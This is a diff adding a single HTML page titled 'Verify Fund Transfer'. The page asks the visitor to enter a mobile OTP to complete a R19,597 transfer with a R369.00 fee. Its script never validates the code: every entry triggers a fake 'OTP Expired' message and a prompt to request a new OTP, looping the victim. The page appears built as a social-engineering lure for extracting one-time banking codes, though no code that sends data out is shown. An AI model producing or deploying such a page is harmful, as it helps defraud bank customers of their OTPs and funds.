@@ -1,0 +1,96 @@
+<Funds Transfer>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Fund Transfer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f2f2f2;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            text-align: center;
+        }
+        h2 {
+            margin-top: 0;
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button, .retry-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover, .retry-button:hover {
+            background-color: #45a049;
+        }
+        .retry-button {
+            display: none; /* Initially hidden */
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="otpContainer">
+    <!-- OTP Input Form -->
+    <div id="otpForm">
+        <h2>Verify Fund Transfer</h2>
+        <p>To complete the transfer of <strong>R19,597</strong> with a transaction fee of <strong>R369.00</strong>, please enter the OTP sent to your mobile.</p>
+        <input type="text" id="otpInput" placeholder="Enter OTP" required>
+        <button onclick="validateOTP()">Validate OTP</button>
+    </div>
+
+    <!-- OTP Expired Message -->
+    <div id="otpExpiredMessage" style="display: none;">
+        <h2>OTP Expired</h2>
+        <p>Your OTP has expired. Please request a new OTP to continue with the fund transfer of <strong>R19,597</strong> plus a <strong>R369.00</strong> transaction fee.</p>
+        <a href="#" class="retry-button" onclick="requestNewOTP()">Request New OTP</a>
+    </div>
+</div>
+
+<script>
+    function validateOTP() {
+        // Simulate OTP expiration - here it just shows expired message immediately
+        document.getElementById("otpForm").style.display = "none";
+        document.getElementById("otpExpiredMessage").style.display = "block";
+    }
+
+    function requestNewOTP() {
+        // Reset the form to request a new OTP
+        document.getElementById("otpInput").value = "";
+        document.getElementById("otpForm").style.display = "block";
+        document.getElementById("otpExpiredMessage").style.display = "none";
+    }
+</script>
+
+</body>
+</html>
